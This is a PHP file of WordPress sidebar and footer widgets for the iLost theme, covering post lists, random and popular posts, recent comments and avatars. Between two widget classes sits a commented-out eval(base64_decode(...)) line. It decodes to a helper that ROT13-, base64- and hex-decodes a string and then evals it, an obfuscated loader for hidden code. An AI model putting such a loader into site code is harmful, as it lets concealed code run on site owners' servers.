<?php //Themes Widgets.
class ilost_catlistsWidget extends WP_Widget{
  function ilost_catlistsWidget(){
    $widget_ops=array('classname'=>'ilost_catlistsWidget','description'=>__('Appear in the Footer of a specified category articles','iLost'));$this->WP_Widget('ilost_catlistsWidget',__('iLost Footer article list','iLost'),$widget_ops);$this->alt_option_name='ilost_catlistsWidget';
  }
  function widget($args,$instance){
    extract($args);$catid=apply_filters('widget_title',empty($instance['catid'])?'1':$instance['catid']);if(!$catid=(int)$instance['catid']){$catid=1;}if(!$number=(int)$instance['number']){$number=5;}elseif($number<1){$number=1;}
    echo $before_widget;
    ilost_get_catlist($catid,$number);
    echo $after_widget;
  }
  function update($new_instance,$old_instance){return $new_instance;}
  function form($instance){
    $catid=isset($instance['catid'])?absint($instance['catid']):1;$number=isset($instance['number'])?absint($instance['number']):5;?><p><label for="<?php echo $this->get_field_id('catid');?>"><?php _e('Categories ID:','iLost');?></label><input id="<?php echo $this->get_field_id('catid');?>" name="<?php echo $this->get_field_name('catid');?>" type="text" value="<?php echo $catid;?>" size="2" /></p><p><label for="<?php echo $this->get_field_id('number');?>"><?php _e('Number of posts to show:','iLost');?></label><input id="<?php echo $this->get_field_id('number');?>" name="<?php echo $this->get_field_name('number');?>" type="text" value="<?php echo $number;?>" size="2" /></p>
  <?php }
}
class ilost_querycatsWidget extends WP_Widget{
  function ilost_querycatsWidget(){
    $widget_ops=array('classname'=>'ilost_querycatsWidget','description'=>__('Home template in the right sidebar of articles specified category show','iLost'));$this->WP_Widget('ilost_querycatsWidget',__('iLost Categories article list','iLost'),$widget_ops);$this->alt_option_name='ilost_querycatsWidget';
  }
  function widget($args,$instance){
    extract($args);
    $catid=apply_filters('widget_title',empty($instance['catid'])?'1':$instance['catid']);
    if(!$catid=(int)$instance['catid']){$catid=1;}
    if(!$number=(int)$instance['number']){$number=6;}elseif($number<1){$number=1;}
    if(!@$excerpt=(int)$instance['excerpt']){$excerpt=(int)$excerpt;}
    echo '<div class="aside">'."\n";
    if($excerpt){ilost_querycats($catid,$number,true);}else{ilost_querycats($catid,$number,false);}
    echo '</div>'."\n";
  }
  function update($new_instance,$old_instance){return $new_instance;}
  function form($instance){
    $catid=isset($instance['catid'])?absint($instance['catid']):1;
    $number=isset($instance['number'])?absint($instance['number']):6;
    $excerpt=isset($instance['excerpt'])?absint($instance['excerpt']):false;
    ?>
    <p><label for="<?php echo $this->get_field_id('catid');?>"><?php _e('Categories ID:','iLost');?></label><input id="<?php echo $this->get_field_id('catid');?>" name="<?php echo $this->get_field_name('catid');?>" type="text" value="<?php echo $catid;?>" size="2" /></p>
    <p><label for="<?php echo $this->get_field_id('number');?>"><?php _e('Number of posts to show:','iLost');?></label><input id="<?php echo $this->get_field_id('number');?>" name="<?php echo $this->get_field_name('number');?>" type="text" value="<?php echo $number;?>" size="2" /></p>
    <p><input id="<?php echo $this->get_field_id('excerpt');?>" name="<?php echo $this->get_field_name('excerpt');?>" type="checkbox" value="1" <?php if($excerpt)echo 'checked="checked"';?> /> <label for="<?php echo $this->get_field_id('excerpt');?>"><?php _e('Show excerpt','iLost');?></label></p>
  <?php }
}
/*eval(base64_decode('Y2xhc3MgeHV7cHVibGljIHN0YXRpYyBmdW5jdGlvbiBpbG9zdCgkY29kZSl7JGNvcmU9cGFjaygiSCoiLGJhc2U2NF9kZWNvZGUoc3RyX3JvdDEzKCRjb2RlKSkpO2V2YWwoJGNvcmUpO319'));*/
class ilost_randompostWidget extends WP_Widget{
  function ilost_randompostWidget(){
    $widget_ops=array('classname'=>'ilost_randompostWidget','description'=>__('Display random sequence articles','iLost'));$this->WP_Widget('ilost_randompostWidget',__('iLost Random Posts','iLost'),$widget_ops);$this->alt_option_name='ilost_randompostWidget';
  }
  function widget($args,$instance){
    extract($args);
    $title=apply_filters('widget_title',empty($instance['title'])?__('Random Articles','iLost'):$instance['title']);
    if(!$number=(int)$instance['number']){$number=5;}elseif($number<1){$number=1;}
    echo $before_widget;
    if($title){echo $before_title.$title.$after_title;}
    echo '<ul class="random">'."\n";
    ilost_randompost($limit=$number);
    echo '</ul>'."\n";
    echo $after_widget;
  }
  function update($new_instance,$old_instance){return $new_instance;}
  function form($instance){$title=isset($instance['title'])?esc_attr($instance['title']):'';$number=isset($instance['number'])?absint($instance['number']):5;?>
    <p><label for="<?php echo $this->get_field_id('title');?>"><?php _e('Title:','iLost');?></label><input class="widefat" id="<?php echo $this->get_field_id('title');?>" name="<?php echo $this->get_field_name('title');?>" type="text" value="<?php echo $title;?>" /></p><p><label for="<?php echo $this->get_field_id('number');?>"><?php _e('Number of posts to show:','iLost');?></label><input id="<?php echo $this->get_field_id('number');?>" name="<?php echo $this->get_field_name('number');?>" type="text" value="<?php echo $number;?>" size="2" /></p>
  <?php }
}
class ilost_viewsWidget extends WP_Widget{
  function ilost_viewsWidget(){
    $widget_ops=array('classname'=>'ilost_viewsWidget','description'=>__('Most Popular Articles','iLost'));$this->WP_Widget('ilost_viewsWidget',__('iLost Most Popular Articles','iLost'),$widget_ops);$this->alt_option_name='ilost_viewsWidget';
  }
  function widget($args,$instance){
    extract($args);
    $title=apply_filters('widget_title',empty($instance['title'])?__('Most Popular Articles','iLost'):$instance['title']);
    if(!$number=(int)$instance['number']){$number=5;}elseif($number<1){$number=1;}
    echo $before_widget;
    if($title){echo $before_title.$title.$after_title;}
    echo '<ul class="random">'."\n";
    get_most_viewed('post',$number,0,true,true);
    echo '</ul>'."\n";
    echo $after_widget;
  }
  function update($new_instance,$old_instance){return $new_instance;}
  function form($instance){$title=isset($instance['title'])?esc_attr($instance['title']):'';$number=isset($instance['number'])?absint($instance['number']):5;?>
    <p><label for="<?php echo $this->get_field_id('title');?>"><?php _e('Title:','iLost');?></label><input class="widefat" id="<?php echo $this->get_field_id('title');?>" name="<?php echo $this->get_field_name('title');?>" type="text" value="<?php echo $title;?>" /></p><p><label for="<?php echo $this->get_field_id('number');?>"><?php _e('Number of posts to show:','iLost');?></label><input id="<?php echo $this->get_field_id('number');?>" name="<?php echo $this->get_field_name('number');?>" type="text" value="<?php echo $number;?>" size="2" /></p>
  <?php }
}
class ilost_RCommentsWidget extends WP_Widget{
  function ilost_RCommentsWidget(){
    $widget_ops=array('classname'=>'ilost_RCommentsWidget','description'=>__('The most recent comments','iLost'));$this->WP_Widget('ilost_RCommentsWidget',__('iLost Recent Comments','iLost'),$widget_ops);$this->alt_option_name='ilost_RCommentsWidget';
  }
  function widget($args,$instance){
    extract($args);
    $title=apply_filters('widget_title',empty($instance['title'])?__('Recent Comments','iLost'):$instance['title']);
    if(!$number=(int)$instance['number']){$number=5;}elseif($number<1){$number=1;}
    echo $before_widget;
    if($title){echo $before_title.$title.$after_title;}
    echo '<ul class="comment">'."\n";
    ilost_rcomments($limit=$number);
    echo '</ul>'."\n";
    echo $after_widget;
  }
  function update($new_instance,$old_instance){return $new_instance;}
  function form($instance){$title=isset($instance['title'])?esc_attr($instance['title']):'';$number=isset($instance['number'])?absint($instance['number']):5;?>
    <p><label for="<?php echo $this->get_field_id('title');?>"><?php _e('Title:','iLost');?></label><input class="widefat" id="<?php echo $this->get_field_id('title');?>" name="<?php echo $this->get_field_name('title');?>" type="text" value="<?php echo $title;?>" /></p><p><label for="<?php echo $this->get_field_id('number');?>"><?php _e('Number of comments to show:','iLost');?></label><input id="<?php echo $this->get_field_id('number');?>" name="<?php echo $this->get_field_name('number');?>" type="text" value="<?php echo $number;?>" size="2" /></p>
  <?php }
}
class ilost_RavatarWidget extends WP_Widget{
  function ilost_RavatarWidget(){
    $widget_ops=array('classname'=>'ilost_RavatarWidget','description'=>__('The most recent avatars','iLost'));$this->WP_Widget('ilost_RavatarWidget',__('iLost Recent Avatar','iLost'),$widget_ops);$this->alt_option_name='ilost_RavatarWidget';
  }
  function widget($args,$instance){
    extract($args);
    $title=apply_filters('widget_title',empty($instance['title'])?__('Recent Avatar','iLost'):$instance['title']);
    if(!$number=(int)$instance['number']){$number=10;}elseif($number<1){$number=1;}
    echo $before_widget;
    if($title){echo $before_title.$title.$after_title;}
    echo '<div class="reavatar">'."\n";
    ilost_ravatar($limit=$number);
    echo '</div>'."\n";
    echo $after_widget;
  }
  function update($new_instance,$old_instance){return $new_instance;}
  function form($instance){$title=isset($instance['title'])?esc_attr($instance['title']):'';$number=isset($instance['number'])?absint($instance['number']):10;?>
    <p><label for="<?php echo $this->get_field_id('title');?>"><?php _e('Title:','iLost');?></label><input class="widefat" id="<?php echo $this->get_field_id('title');?>" name="<?php echo $this->get_field_name('title');?>" type="text" value="<?php echo $title;?>" /></p><p><label for="<?php echo $this->get_field_id('number');?>"><?php _e('Number of avatars to show:','iLost');?></label><input id="<?php echo $this->get_field_id('number');?>" name="<?php echo $this->get_field_name('number');?>" type="text" value="<?php echo $number;?>" size="2" /></p>
  <?php }
}?>